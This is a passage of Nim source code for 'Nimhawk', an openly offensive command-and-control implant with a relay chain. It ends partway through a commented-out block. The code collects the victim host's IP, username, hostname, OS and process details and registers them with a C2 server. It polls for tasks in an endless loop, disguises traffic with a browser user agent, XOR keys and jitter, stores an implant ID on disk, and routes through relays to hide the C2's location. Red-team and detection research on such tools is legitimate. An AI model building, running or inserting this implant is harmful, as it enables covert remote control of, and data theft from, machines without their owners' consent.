#[
    Nimhawk Multi-Platform Implant with Dynamic Relay System
    Simple polling-based relay system without threads
    by Alejandro Parodi (@hdbreaker_)
]#

import os, random, strutils, times, math, osproc, net, nativesockets, json
import tables
import asyncdispatch
import core/webClientListener
# Import persistence functions
from core/webClientListener import getStoredImplantID, storeImplantID, postRawData
from config/configParser import parseConfig, INITIAL_XOR_KEY
import util/[strenc, sysinfo, crypto]
import core/cmdParser
import core/relay_launcher
# Old relay system removed - will be replaced with simple HTTP relay

# Re-export system info functions for compatibility
export getLocalIP, getUsername, getSysHostname, getOSInfo, getCurrentPID, getCurrentProcessName

# Relay functionality will be reimplemented with simple HTTP forwarding

# Simple async communication queues (no locks needed in single-thread async)
type
    CommandTask* = object
        guid*: string
        command*: string
        args*: seq[string]
        targetClientId*: string
        timestamp*: int64
    
    CommandResult* = object
        guid*: string
        result*: string
        clientId*: string
        timestamp*: int64
    
    RelayRegistration* = object
        clientId*: string
        localIP*: string
        username*: string
        hostname*: string
        osInfo*: string
        pid*: int
        processName*: string
        timestamp*: int64

# Global async state (no locks needed)
var
    g_commandsFromC2*: seq[CommandTask] = @[]
    g_commandsToC2*: seq[CommandResult] = @[]
    g_relayRegistrations*: seq[RelayRegistration] = @[]
    # g_relayServer is now imported from relay_commands.nim to avoid conflicts
    
# Global relay client encryption key for consistent messaging
var g_relayClientKey: string = ""

# Global relay server ID (fixed, generated once)
var g_relayServerID: string = ""

# Generate fixed relay server ID - moved from relay_topology module
proc getRelayServerID*(): string =
    if g_relayServerID == "":
        g_relayServerID = "RELAY-SERVER-" & $(rand(9999) + 1000)
    return g_relayServerID

# Global relay client ID (for relay communication)
var g_relayClientID: string = ""

# Global variable to store the parent relay server GUID (for RELAY_CLIENT)
var g_parentRelayServerGuid: string = ""

# Global variables for confirmation protocol
var g_waitingForConfirmationAck: bool = false
var g_confirmationAckTimeout: int64 = 0

proc getRelayClientID(): string =
    return g_relayClientID

proc setRelayClientID(clientID: string) =
    g_relayClientID = clientID

proc setParentRelayServerGuid(guid: string) =
    g_parentRelayServerGuid = guid
    when defined debug:
        echo "[DEBUG] 🔗 Chain Info: Set parent relay server GUID to: " & guid

proc getParentRelayServerGuid(): string =
    return g_parentRelayServerGuid

# Helper function to extract parent GUID from relay server registration
proc extractParentGuidFromRelayConnection(): string =
    # HTTP relay system: parent GUID is stored during registration
    if g_parentRelayServerGuid != "":
        return g_parentRelayServerGuid
    else:
        when defined debug:
            echo "[DEBUG] 🔗 Chain Info: Parent GUID not stored"
        return ""

# Speed optimization constants - CLIENT-SIDE CONFIGURATION
when defined(FAST_MODE):
    const CLIENT_FAST_MODE* = true
    const RELAY_POLL_INTERVAL = 1000    # 1 second in fast mode (was 500ms - too aggressive)
    const ERROR_RECOVERY_SLEEP = 1000   # 1 second error recovery in fast mode
    const RECONNECT_DELAY = 2000        # 2 seconds reconnect delay in fast mode
else:
    const CLIENT_FAST_MODE* = false
    const RELAY_POLL_INTERVAL = 2000    # 2 seconds normal mode (was 1000ms)
    const ERROR_RECOVERY_SLEEP = 2000   # 2 seconds error recovery normal mode  
    const RECONNECT_DELAY = 3000        # 3 seconds reconnect delay normal mode

# Server-side adaptive timing (adapts to client mode)
var g_serverFastMode* = false  # Server adapts to client mode dynamically
var g_adaptiveMaxSleep* = 2000  # Default 2 seconds, adapts to client

# Reconnection management to prevent infinite loops
type
    ReconnectionManager* = object
        attempts*: int
        lastAttemptTime*: int64
        maxAttempts*: int
        baseDelay*: int  # milliseconds
        maxDelay*: int   # milliseconds
        backoffMultiplier*: float

var g_reconnectionManager*: ReconnectionManager = ReconnectionManager(
    attempts: 0,
    lastAttemptTime: 0,
    maxAttempts: 10,  # Max 10 attempts before giving up
    baseDelay: 2000,  # Start with 2 seconds
    maxDelay: 300000, # Max 5 minutes delay
    backoffMultiplier: 2.0  # Double delay each time
)

proc canAttemptReconnection*(): bool =
    ## Check if we can attempt reconnection based on backoff policy
    let currentTime = epochTime().int64
    
    # Reset attempts if enough time has passed (1 hour cooldown)
    if currentTime - g_reconnectionManager.lastAttemptTime > 3600:
        g_reconnectionManager.attempts = 0
        when defined debug:
            echo "[RECONNECT] 🔄 Attempt counter reset after 1 hour cooldown"
    
    # Check if we've exceeded max attempts
    if g_reconnectionManager.attempts >= g_reconnectionManager.maxAttempts:
        when defined debug:
            echo "[RECONNECT] 🚨 Max reconnection attempts exceeded (" & $g_reconnectionManager.maxAttempts & ")"
            echo "[RECONNECT] 🚨 Entering long cooldown period"
        return false
    
    return true

proc getReconnectionDelay*(): int =
    ## Calculate exponential backoff delay for reconnection
    let baseDelay = float(g_reconnectionManager.baseDelay)
    let multiplier = pow(g_reconnectionManager.backoffMultiplier, float(g_reconnectionManager.attempts))
    let delay = int(baseDelay * multiplier)
    
    # Apply max delay cap
    result = min(delay, g_reconnectionManager.maxDelay)
    
    when defined debug:
        echo "[RECONNECT] 📊 Backoff calculation:"
        echo "[RECONNECT] 📊 - Attempt: " & $g_reconnectionManager.attempts
        echo "[RECONNECT] 📊 - Base delay: " & $baseDelay.int & "ms"
        echo "[RECONNECT] 📊 - Multiplier: " & $multiplier
        echo "[RECONNECT] 📊 - Calculated delay: " & $delay & "ms"
        echo "[RECONNECT] 📊 - Final delay (capped): " & $result & "ms"

# Helper function to create relay client listeners
proc createRelayClientListener(baseListener: Listener, clientID: string, clientKey: string = ""): Listener =
    ## Create a specific listener for a relay client with proper configuration
    ## This avoids the hack of modifying the relay server's listener
    result = Listener()
    
    # Copy connection configuration from base listener (relay server)
    result.listenerType = baseListener.listenerType
    result.listenerHost = baseListener.listenerHost
    result.implantCallbackIp = baseListener.implantCallbackIp
    result.listenerPort = baseListener.listenerPort
    result.registerPath = baseListener.registerPath
    result.taskPath = baseListener.taskPath
    result.resultPath = baseListener.resultPath
    result.reconnectPath = baseListener.reconnectPath
    result.userAgent = baseListener.userAgent
    result.httpAllowCommunicationKey = baseListener.httpAllowCommunicationKey
    result.sleepTime = baseListener.sleepTime
    result.sleepJitter = baseListener.sleepJitter
    result.killDate = baseListener.killDate
    
    # Set relay client-specific configuration
    result.id = clientID
    result.initialized = true  # Relay clients are always initialized through relay server
    result.registered = true   # Relay clients are always registered through relay server
    result.UNIQUE_XOR_KEY = if clientKey != "": clientKey else: baseListener.UNIQUE_XOR_KEY
    
    when defined debug:
        echo "[DEBUG] 🔧 Created relay client listener for: " & clientID
        echo "[DEBUG] 🔧 - ID: " & result.id
        echo "[DEBUG] 🔧 - Key available: " & $(result.UNIQUE_XOR_KEY != "")
        echo "[DEBUG] 🔧 - Target C2: " & result.implantCallbackIp & ":" & result.listenerPort

proc recordReconnectionAttempt*() =
    ## Record a reconnection attempt for backoff tracking
    g_reconnectionManager.attempts += 1
    g_reconnectionManager.lastAttemptTime = epochTime().int64
    
    when defined debug:
        echo "[RECONNECT] 📈 Recorded attempt #" & $g_reconnectionManager.attempts & "/" & $g_reconnectionManager.maxAttempts

proc resetReconnectionManager*() =
    ## Reset reconnection manager after successful connection
    g_reconnectionManager.attempts = 0
    g_reconnectionManager.lastAttemptTime = epochTime().int64
    
    when defined debug:
        echo "[RECONNECT] ✅ Reconnection manager reset after successful connection"

# Network Adaptive Throttling System
type
    NetworkHealth* = object
        rtt*: float  # Round-trip time in milliseconds
        consecutiveErrors*: int
        lastSuccessTime*: int64
        isSlowNetwork*: bool
        adaptiveMultiplier*: float

var g_networkHealth*: NetworkHealth = NetworkHealth(
    rtt: 50.0,  # Start with 50ms baseline
    consecutiveErrors: 0,
    lastSuccessTime: epochTime().int64,
    isSlowNetwork: false,
    adaptiveMultiplier: 1.0
)

# Enhanced network health management with safety margins
proc updateNetworkHealth*(startTime: float, success: bool) =
    let currentTime = epochTime()
    
    if success:
        # Calculate RTT and update network health with proper float precision
        let rtt = (currentTime - startTime) * 1000.0  # Convert to milliseconds
        
        # Ensure RTT is reasonable (between 1ms and 60s)
        let validRtt = max(min(rtt, 60000.0), 1.0)
        
        # Exponential moving average for RTT
        g_networkHealth.rtt = (g_networkHealth.rtt * 0.7) + (validRtt * 0.3)
        g_networkHealth.consecutiveErrors = 0
        g_networkHealth.lastSuccessTime = currentTime.int64
        
        # SAFETY MARGIN: Reset multiplier gradually when network improves
        let oldMultiplier = g_networkHealth.adaptiveMultiplier
        
        # Determine if network is slow (RTT > 200ms)
        g_networkHealth.isSlowNetwork = g_networkHealth.rtt > 200.0
        
        # Calculate adaptive multiplier based on network conditions with safety margins
        if g_networkHealth.rtt > 500.0:
            g_networkHealth.adaptiveMultiplier = 4.0  # Very slow network
        elif g_networkHealth.rtt > 200.0:
            g_networkHealth.adaptiveMultiplier = 2.0  # Slow network
        elif g_networkHealth.rtt > 100.0:
            g_networkHealth.adaptiveMultiplier = 1.5  # Medium network
        else:
            # SAFETY MARGIN: Gradual reduction instead of immediate reset
            if oldMultiplier > 1.0:
                g_networkHealth.adaptiveMultiplier = max(1.0, oldMultiplier * 0.8)  # 20% reduction per success
                when defined debug:
                    echo "[DEBUG] 🌐 ⚡ Gradual multiplier reduction: " & $oldMultiplier & " → " & $g_networkHealth.adaptiveMultiplier
            else:
                g_networkHealth.adaptiveMultiplier = 1.0  # Fast network
        
        when defined debug:
            echo "[DEBUG] 🌐 Network Health Updated - RTT: " & $g_networkHealth.rtt.int & "ms, Multiplier: " & $g_networkHealth.adaptiveMultiplier & ", Raw RTT: " & $validRtt.int & "ms"
    else:
        # Network error - increase consecutive errors and implement exponential backoff
        g_networkHealth.consecutiveErrors += 1
        let errorMultiplier = min(pow(2.0, float(g_networkHealth.consecutiveErrors)), 8.0)  # Max 8x backoff
        
        # SAFETY MARGIN: Don't let error multiplier override good RTT-based multiplier
        let rttBasedMultiplier = if g_networkHealth.rtt > 500.0: 4.0
                                elif g_networkHealth.rtt > 200.0: 2.0
                                elif g_networkHealth.rtt > 100.0: 1.5
                                else: 1.0
        
        # Use the higher of error-based or RTT-based multiplier
        g_networkHealth.adaptiveMultiplier = max(rttBasedMultiplier, errorMultiplier)
        
        when defined debug:
            echo "[DEBUG] 🚨 Network Error - Consecutive: " & $g_networkHealth.consecutiveErrors & ", Error Multiplier: " & $errorMultiplier & ", RTT Multiplier: " & $rttBasedMultiplier & ", Final: " & $g_networkHealth.adaptiveMultiplier

# SAFETY RESET: Force reset of network health after extended periods
proc resetNetworkHealthIfStuck*() =
    let currentTime = epochTime().int64
    let timeSinceLastUpdate = currentTime - g_networkHealth.lastSuccessTime
    
    # If no success for 5 minutes and multiplier is high, force reset
    if timeSinceLastUpdate > 300 and g_networkHealth.adaptiveMultiplier > 2.0:
        when defined debug:
            echo "[DEBUG] 🔄 SAFETY RESET: Network health stuck for " & $timeSinceLastUpdate & "s"
            echo "[DEBUG] 🔄 Old state - RTT: " & $g_networkHealth.rtt.int & "ms, Multiplier: " & $g_networkHealth.adaptiveMultiplier & ", Errors: " & $g_networkHealth.consecutiveErrors
        
        # Gradual reset instead of immediate
        g_networkHealth.adaptiveMultiplier = max(1.5, g_networkHealth.adaptiveMultiplier * 0.5)  # Half the multiplier
        g_networkHealth.consecutiveErrors = max(0, g_networkHealth.consecutiveErrors - 2)  # Reduce errors by 2
        g_networkHealth.rtt = min(g_networkHealth.rtt, 100.0)  # Cap RTT at reasonable value
        
        when defined debug:
            echo "[DEBUG] 🔄 New state - RTT: " & $g_networkHealth.rtt.int & "ms, Multiplier: " & $g_networkHealth.adaptiveMultiplier & ", Errors: " & $g_networkHealth.consecutiveErrors
            echo "[DEBUG] 🔄 ✅ Network health safety reset completed"

# Get adaptive polling interval based on network conditions with safety bounds
proc getAdaptivePollingInterval*(): int =
    # SAFETY CHECK: Reset network health if stuck
    resetNetworkHealthIfStuck()
    
    let baseInterval = if CLIENT_FAST_MODE: 1000 else: 2000
    let adaptiveInterval = int(float(baseInterval) * g_networkHealth.adaptiveMultiplier)
    
    # ENHANCED SAFETY BOUNDS: Stricter limits to prevent extreme delays
    result = min(max(adaptiveInterval, 500), 20000)  # Max 20s instead of 30s
    
    when defined(debug):
        if result != adaptiveInterval:
            echo "[DEBUG] 🛡️  SAFETY BOUND APPLIED: Requested " & $adaptiveInterval & "ms, capped to " & $result & "ms"

# Get adaptive timeout based on network conditions with safety bounds
proc getAdaptiveTimeout*(): int =
    let baseTimeout = if g_networkHealth.isSlowNetwork: 200 else: 100
    let adaptiveTimeout = int(float(baseTimeout) * g_networkHealth.adaptiveMultiplier)
    
    # ENHANCED SAFETY BOUNDS: Stricter timeout limits
    result = min(max(adaptiveTimeout, 50), 3000)  # Max 3s instead of 5s
    
    when defined(debug):
        if result != adaptiveTimeout:
            echo "[DEBUG] 🛡️  TIMEOUT SAFETY BOUND: Requested " & $adaptiveTimeout & "ms, capped to " & $result & "ms"

# Legacy relay connection function - commented out for HTTP relay system
#[
# Connect to upstream relay
proc connectToUpstreamRelay(host: string, port: int): string =
    when defined debug:
        echo "[DEBUG] Connecting to upstream relay: " & host & ":" & $port
    
    try:
        upstreamRelay = connectToRelay(host, port)
        if upstreamRelay.isConnected:
            when defined debug:
                echo "[DEBUG] Successfully connected to upstream relay"
            
            # CRITICAL: Initialize relay system with shared key before any messaging
            when defined debug:
                echo "[DEBUG] 🔑 Initializing relay client system with shared key..."
            
            # Determine implant ID for initialization (same logic as below)
            var tempImplantID: string
            if g_relayClientID != "" and g_relayClientID != "PENDING-REGISTRATION":
                tempImplantID = g_relayClientID
            else:
                tempImplantID = getStoredImplantID()
                if tempImplantID == "":
                    tempImplantID = "PENDING-REGISTRATION"
            
            # Initialize relay system with shared key 
            let systemReady = relay_commands.initializeRelaySystem(tempImplantID)
            if not systemReady:
                when defined debug:
                    echo "[DEBUG] ❌ Failed to initialize relay system"
                return "Failed to initialize relay client system"
            
            when defined debug:
                echo "[DEBUG] ✅ Relay client system initialized with shared key"
            
            # Send registration with complete system info
            # CRITICAL: Preserve existing ID during reconnections (prevents ID amnesia)
            var implantID: string
            
            # PRIORITY 1: Use in-memory ID if available (prevents ID amnesia during reconnects)
            if g_relayClientID != "" and g_relayClientID != "PENDING-REGISTRATION":
                implantID = g_relayClientID
                when defined debug:
                    echo "[DEBUG] 🧠 RECONNECT: Using IN-MEMORY relay client ID: " & implantID & " (prevents ID amnesia)"
                
                # CRITICAL: Ensure in-memory ID is also persisted to disk
                let diskID = getStoredImplantID()
                if diskID != implantID:
                    storeImplantID(implantID)
                    when defined debug:
                        echo "[DEBUG] 💾 PERSIST: Re-saved in-memory ID to disk: " & implantID
                else:
                    when defined debug:
                        echo "[DEBUG] ✅ PERSIST: ID already correctly stored on disk"
            else:
                # PRIORITY 2: Use stored ID from disk (first run or memory cleared)
                implantID = getStoredImplantID()
                if implantID != "":
                    when defined debug:
                        echo "[DEBUG] 💾 FIRST RUN: Using STORED relay client ID: " & implantID
                    # Store in memory for future reconnects
                    g_relayClientID = implantID
                else:
                    # PRIORITY 3: New registration only if no ID exists anywhere
                    implantID = "PENDING-REGISTRATION"
                    when defined debug:
                        echo "[DEBUG] 🆕 NEW CLIENT: No existing ID - requesting new registration from C2"
            
            # Store the ID globally for consistent use
            g_relayClientID = implantID
            
            let route = @[implantID, "UPSTREAM"]
            
            # Collect system information for relay registration
            let localIP = getLocalIP()
            let username = getUsername()
            let hostname = getSysHostname()
            let osInfo = getOSInfo()
            let pid = getCurrentPID()
            let processName = getCurrentProcessName()
            
            # Create complete registration data as JSON
            let regData = %*{
                "implantID": implantID,
                "localIP": localIP,
                "username": username,
                "hostname": hostname,
                "osInfo": osInfo,
                "pid": pid,
                "processName": processName,
                "timestamp": epochTime().int64,
                "capabilities": ["relay", "client"],
                "mode": "relay_client",
                "fastMode": CLIENT_FAST_MODE,  # Include client fast mode setting
                "pollInterval": RELAY_POLL_INTERVAL  # Include client polling interval for server adaptation
            }
            
            let registerMsg = createMessage(REGISTER, implantID, route, $regData)
            
            when defined debug:
                echo "[DEBUG] 🆕 ┌─────────── SENDING REGISTER MESSAGE ───────────┐"
                echo "[DEBUG] 🆕 │ Sending REGISTER to relay server... │"
                echo "[DEBUG] 🆕 │ Client ID: " & implantID & " │"
                echo "[DEBUG] 🆕 │ Message type: REGISTER │"
                echo "[DEBUG] 🆕 │ Route: " & $route & " │"
                echo "[DEBUG] 🆕 │ Registration data size: " & $regData.len & " bytes │"
                echo "[DEBUG] 🆕 │ Expected response: ID assignment + encryption key │"
                echo "[DEBUG] 🆕 └─────────────────────────────────────────────────┘"
            
            if sendMessage(upstreamRelay, registerMsg):
                when defined debug:
                    echo "[DEBUG] ✅ ┌─────────── REGISTER SENT SUCCESSFULLY ───────────┐"
                    echo "[DEBUG] ✅ │ REGISTER message sent to relay server │"
                    echo "[DEBUG] ✅ │ Now waiting for ID assignment response... │"
                    echo "[DEBUG] ✅ │ Client should receive: {\"id\": \"...\", \"key\": \"...\"} │"
                    echo "[DEBUG] ✅ └─────────────────────────────────────────────────┘"
                    
                    # CRITICAL: Wait a moment for the response before returning success
                    echo "[DEBUG] ⏱️  Waiting for relay server registration response..."
                    
                return "Connected and registered with upstream relay: " & host & ":" & $port
            else:
                when defined debug:
                    echo "[DEBUG] ❌ ┌─────────── REGISTER SEND FAILED ───────────┐"
                    echo "[DEBUG] ❌ │ Failed to send REGISTER message! │"
                    echo "[DEBUG] ❌ │ Connection might be broken │"
                    echo "[DEBUG] ❌ └─────────────────────────────────────────────┘"
                return "Connected to upstream relay but failed to register: " & host & ":" & $port
    except Exception as e:
        return "Error connecting to upstream relay: " & e.msg
]#

# Legacy relay command processing - not used in HTTP relay system
# processRelayCommand is now imported from modules/relay/relay_commands

# Safe encryption key management to prevent desync cascade
proc safeKeySwap(listener: var Listener, newKey: string): string =
    ## Safely swap encryption keys with atomic rollback protection
    let originalKey = listener.UNIQUE_XOR_KEY
    listener.UNIQUE_XOR_KEY = newKey
    return originalKey

proc safeKeyRestore(listener: var Listener, originalKey: string) =
    ## Safely restore original encryption key
    listener.UNIQUE_XOR_KEY = originalKey
    when defined debug:
        echo "[KEY] 🔑 Encryption key restored safely"

proc clearSensitiveKey(key: var string) =
    ## Securely clear encryption key from memory
    if key != "":
        # Overwrite with zeros before clearing
        for i in 0..<key.len:
            key[i] = '\0'
        key = ""
        when defined debug:
            echo "[KEY] 🧹 Sensitive key cleared from memory"

# Get encryption key from C2 reconnect endpoint for existing relay client
proc getEncryptionKeyFromC2Reconnect(li: var Listener, clientId: string): string =
    when defined debug:
        echo "[DEBUG] 🔑 Getting encryption key from C2 reconnect endpoint for client: " & clientId
    
    # CRITICAL FIX: For re-registration, we need to perform a NEW registration
    # instead of trying to reconnect with a potentially unknown ID
    # The relay client is already registered with the relay server but needs
    # to be registered with the C2 server to get an encryption key
    
    # Create temporary listener for new registration
    var tempListener = li
    tempListener.id = ""  # Clear ID to force new registration
    tempListener.initialized = false
    tempListener.registered = false
    
    # Initialize new registration
    webClientListener.init(tempListener)
    
    when defined debug:
        echo "[DEBUG] 🔑 New registration completed for relay client"
        echo "[DEBUG] 🔑 Registration success: " & $tempListener.registered
        echo "[DEBUG] 🔑 Encryption key length: " & $tempListener.UNIQUE_XOR_KEY.len
        echo "[DEBUG] 🔑 Assigned ID: " & tempListener.id
    
    if tempListener.registered and tempListener.UNIQUE_XOR_KEY != "":
        when defined debug:
            echo "[DEBUG] 🔑 Successfully got encryption key from C2 new registration"
        return tempListener.UNIQUE_XOR_KEY
    else:
        when defined debug:
            echo "[DEBUG] 🔑 Failed to get encryption key from C2 new registration"
        return ""

# Async HTTP handler - Handles C2 communication
proc httpHandler() {.async.} =
    when defined debug:
        echo "[DEBUG] 🌐 Starting async HTTP handler"
    
    # Parse configuration
    let CONFIG: Table[string, string] = configParser.parseConfig()
    
    # Create listener object with configuration
    var listener = Listener()
    
    # Load configuration into listener
    listener.listenerType = CONFIG.getOrDefault("listenerType", "HTTP")
    listener.listenerHost = ""  # No longer used, logic moved to doRequest
    
    # SECURITY FIX: Relay clients should NOT have C2 URL compiled into binary
    # Only use first hop from RELAY_CHAIN to avoid exposing C2 location
    const RELAY_CHAIN {.strdefine.}: string = ""
    when RELAY_CHAIN != "":
        # Extract first hop (host:port) from RELAY_CHAIN
        const relayChainParts = RELAY_CHAIN.split(",")
        const firstHop = relayChainParts[0]
        # Parse host and port from first hop
        let hopParts = firstHop.split(":")
        listener.implantCallbackIp = hopParts[0]
        listener.listenerPort = if hopParts.len > 1: hopParts[1] else: "80"
        when defined debug:
            echo "[DEBUG] 🔒 SECURITY: Relay client using first hop only (C2 URL not compiled)"
            echo "[DEBUG] 🔒 First hop: " & firstHop
    else:
        # Standard implant - load C2 URL from config
        listener.implantCallbackIp = CONFIG.getOrDefault("implantCallbackIp", "127.0.0.1")
        listener.listenerPort = CONFIG.getOrDefault("listenerPort", "80")
    listener.registerPath = CONFIG.getOrDefault("listenerRegPath", "/register")
    listener.taskPath = CONFIG.getOrDefault("listenerTaskPath", "/task")
    listener.resultPath = CONFIG.getOrDefault("listenerResPath", "/result")
    listener.reconnectPath = CONFIG.getOrDefault("reconnectPath", "/reconnect")
    listener.userAgent = CONFIG.getOrDefault("userAgent", "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko")
    listener.httpAllowCommunicationKey = CONFIG.getOrDefault("httpAllowCommunicationKey", "DefaultKey123")
    listener.sleepTime = parseInt(CONFIG.getOrDefault("sleepTime", "10"))
    listener.sleepJitter = parseFloat(CONFIG.getOrDefault("sleepJitter", "0"))
    listener.killDate = CONFIG.getOrDefault("killDate", "")
    
    # CRITICAL FIX: Check relay mode first before determining initialization strategy
    # HTTP relay system: check if RELAY_CHAIN is defined
    # Legacy: let inRelayMode = relay_commands.isConnectedToRelay
    let inRelayMode = false  # Disabled legacy relay system
    
    when defined debug:
        echo "[DEBUG] 🌐 HTTP Handler: Relay mode status: " & $inRelayMode
    
    # HYBRID MODE FIX: In RELAY_MODE, the HTTP handler should NOT register with C2
    # Only the relayClientHandler should handle registration (via relay protocol)
    when defined(RELAY_MODE):
        when defined debug:
            echo "[DEBUG] 🔗 HTTP Handler: HYBRID MODE - HTTP handler will NOT register with C2"
            echo "[DEBUG] 🔗 HTTP Handler: Only relayClientHandler handles registration via relay protocol"
            echo "[DEBUG] 🔗 HTTP Handler: HTTP handler ONLY manages RelayServer (when started with 'relay port')"
        
        # In RELAY_MODE compilation, HTTP handler NEVER registers with C2
        listener.initialized = false
        listener.registered = false
    else:
        # NORMAL MODE: Only when NOT compiled as RELAY_MODE
        if not inRelayMode:
            # NOT in relay mode - can make direct HTTP calls to C2
            let storedId = getStoredImplantID()
            if storedId != "":
                when defined debug:
                    echo "[DEBUG] 🔄 HTTP Handler: Found stored ID: " & storedId & " - attempting direct C2 reconnection"
                
                # Set the stored ID and attempt reconnection
                listener.id = storedId
                webClientListener.reconnect(listener)
                
                # Check if reconnection was successful
                if listener.initialized and listener.registered:
                    when defined debug:
                        echo "[DEBUG] ✅ HTTP Handler: Direct C2 reconnection successful with stored ID: " & storedId
                    
                    # CRITICAL FIX: Sync relay client encryption key from HTTP listener
                    if listener.UNIQUE_XOR_KEY != "":
                        g_relayClientKey = listener.UNIQUE_XOR_KEY
                        when defined debug:
                            echo "[DEBUG] 🔑 RECONNECTION FIX: Synced g_relayClientKey from listener"
                            echo "[DEBUG] 🔑 RECONNECTION FIX: Key length: " & $g_relayClientKey.len
                    
                    # Start HTTP relay server if RELAY_PORT is configured
                    if relay_launcher.isRelayServer() and listener.id != "":
                        when defined debug:
                            echo "[RELAY] 🚀 Starting HTTP relay server after reconnection with GUID: " & listener.id
                        try:
                            await relay_launcher.startRelayServerAsync(listener.id)
                        except Exception as e:
                            when defined debug:
                                echo "[RELAY] ❌ Failed to start relay server: " & e.msg
                else:
                    when defined debug:
                        echo "[DEBUG] ❌ HTTP Handler: Direct C2 reconnection failed - will register as new implant"
                    # Clear failed ID and reinitialize
                    listener.id = ""
                    listener.initialized = false
                    listener.registered = false
                    webClientListener.init(listener)
                    
                    # CRITICAL FIX: Sync relay client encryption key from HTTP listener after reinitialization
                    if listener.UNIQUE_XOR_KEY != "":
                        g_relayClientKey = listener.UNIQUE_XOR_KEY
                        when defined debug:
                            echo "[DEBUG] 🔑 REINITIALIZATION FIX: Synced g_relayClientKey from listener"
                            echo "[DEBUG] 🔑 REINITIALIZATION FIX: Key length: " & $g_relayClientKey.len
            else:
                when defined debug:
                    echo "[DEBUG] 🆕 HTTP Handler: No stored ID found - performing initial C2 registration"
                # No stored ID, perform initial registration
                webClientListener.init(listener)
                
                # CRITICAL FIX: Sync relay client encryption key from HTTP listener after initialization
                if listener.UNIQUE_XOR_KEY != "":
                    g_relayClientKey = listener.UNIQUE_XOR_KEY
                    when defined debug:
                        echo "[DEBUG] 🔑 INITIALIZATION FIX: Synced g_relayClientKey from listener"
                        echo "[DEBUG] 🔑 INITIALIZATION FIX: Key length: " & $g_relayClientKey.len
                
                # Start HTTP relay server if RELAY_PORT is configured
                if relay_launcher.isRelayServer() and listener.registered and listener.id != "":
                    when defined debug:
                        echo "[RELAY] 🚀 Starting HTTP relay server after initial registration with GUID: " & listener.id
                    try:
                        await relay_launcher.startRelayServerAsync(listener.id)
                    except Exception as e:
                        when defined debug:
                            echo "[RELAY] ❌ Failed to start relay server: " & e.msg
        else:
            # IN relay mode - encryption key must come from RelayServer, not direct C2 HTTP
            when defined debug:
                echo "[DEBUG] 🔗 HTTP Handler: IN RELAY MODE - skipping direct C2 initialization"
                echo "[DEBUG] 🔗 HTTP Handler: Encryption key will be provided by RelayServer via relay protocol"
            
            # In relay mode, we don't initialize the HTTP listener directly
            # The relay client handler will manage C2 communication
            listener.initialized = false
            listener.registered = false
    
    # Complete registration if listener is initialized but not yet registered
    # BUT ONLY if NOT in relay mode AND NOT compiled as RELAY_MODE
    when not defined(RELAY_MODE):
        if not inRelayMode and listener.initialized and not listener.registered:
            when defined debug:
                echo "[DEBUG] 🌐 HTTP Handler: Completing direct C2 registration"
                
            # Register this implant with C2
            let localIP = getLocalIP()
            let username = getUsername()
            let hostname = getSysHostname()
            let osInfo = getOSInfo()
            let pid = getCurrentPID()
            let processName = getCurrentProcessName()
            
            # HTTP relay system: role is determined by RELAY_CHAIN/RELAY_PORT compile flags
            let relayRole = when defined(RELAY_PORT):
                "RELAY_SERVER"  # Compiled with listen port - will act as relay server
            elif defined(RELAY_CHAIN):
                "RELAY_CLIENT"  # Compiled with relay chain - connects through relay
            else:
                "STANDARD"      # Standard agent - direct C2 connection
            
            webClientListener.postRegisterRequest(listener, localIP, username, hostname, 
                                                 osInfo, pid, processName, false, relayRole)
            
            # CRITICAL FIX: Sync relay client encryption key from HTTP listener after registration
            if listener.UNIQUE_XOR_KEY != "":
                g_relayClientKey = listener.UNIQUE_XOR_KEY
                when defined debug:
                    echo "[DEBUG] 🔑 REGISTRATION FIX: Synced g_relayClientKey from listener"
                    echo "[DEBUG] 🔑 REGISTRATION FIX: Key length: " & $g_relayClientKey.len
            
            when defined debug:
                echo "[DEBUG] 🌐 HTTP Handler: Direct C2 registration completed"
            
            # Start HTTP relay server if RELAY_PORT is configured
            if relay_launcher.isRelayServer() and listener.registered and listener.id != "":
                when defined debug:
                    echo "[RELAY] 🚀 Starting HTTP relay server with implant GUID: " & listener.id
                    echo "[RELAY] 🚀 Port: " & $relay_launcher.getRelayServerPort()
                
                try:
                    # Start relay server asynchronously with the real implant GUID
                    await relay_launcher.startRelayServerAsync(listener.id)
                except Exception as e:
                    when defined debug:
                        echo "[RELAY] ❌ Failed to start relay server: " & e.msg
        elif inRelayMode:
            when defined debug:
                echo "[DEBUG] 🔗 HTTP Handler: Skipping C2 registration - in relay mode"
    
    when defined debug:
        echo "[DEBUG] 🌐 HTTP Handler: Implant registered with C2"
        echo "[DEBUG] 🌐 HTTP Handler: Starting polling loop with " & $listener.sleepTime & "s interval"
    
    # MAIN POLLING LOOP - This is what was missing!
    var httpCycleCount = 0
    while true:
        try:
            httpCycleCount += 1
            
            when defined debug:
                echo ""
                echo ""
                echo ""
                echo "┌─ 🌐 HTTP HANDLER CYCLE #" & $httpCycleCount
                # Legacy: │ Relay: " & $g_relayServer.isListening
                echo "├─ C2: " & listener.implantCallbackIp & ":" & listener.listenerPort & " │ Sleep: " & $listener.sleepTime & "s │ HTTP Relay System"
                echo "└─────────────────────────────────────────────────────────"
                echo ""
                echo "[DEBUG] 🌐 HTTP Handler: Starting polling cycle"
            
            # 1. Handle relay registrations - forward to C2
            for registration in g_relayRegistrations:
                when defined debug:
                    echo "[DEBUG] 🌐 HTTP Handler: Forwarding relay registration to C2: " & registration.clientId
                
                discard webClientListener.postRelayRegisterRequest(listener, registration.clientId, 
                                                          registration.localIP, registration.username, 
                                                          registration.hostname, registration.osInfo, 
                                                          registration.pid, registration.processName, true, "RELAY_CLIENT")
                
                when defined debug:
                    echo "[DEBUG] 🌐 HTTP Handler: ✅ Relay registration forwarded to C2"
            
            g_relayRegistrations = @[]  # Clear processed registrations
            
            # HTTP Relay System: Legacy relay server polling code commented out
            # The HTTP relay system doesn't use g_relayServer - it uses startHttpRelayServer() from http_relay.nim
            #[
            # 1.5. CRITICAL: Poll relay server for messages (if running)
            when defined debug:
                echo "[DEBUG] 🌐 HTTP Handler: ═══════════════════════════════════════════════════"
                echo "[DEBUG] 🌐 HTTP Handler: CHECKING RELAY SERVER STATUS (from HTTP handler)"
                echo "[DEBUG] 🌐 HTTP Handler: - g_relayServer.isListening: " & $g_relayServer.isListening
                echo "[DEBUG] 🌐 HTTP Handler: - g_relayServer.port: " & $g_relayServer.port
                let stats = relay_commands.getConnectionStats(g_relayServer)
                echo "[DEBUG] 🌐 HTTP Handler: - Relay server connections: " & $stats.connections
                echo "[DEBUG] 🌐 HTTP Handler: ═══════════════════════════════════════════════════"
            
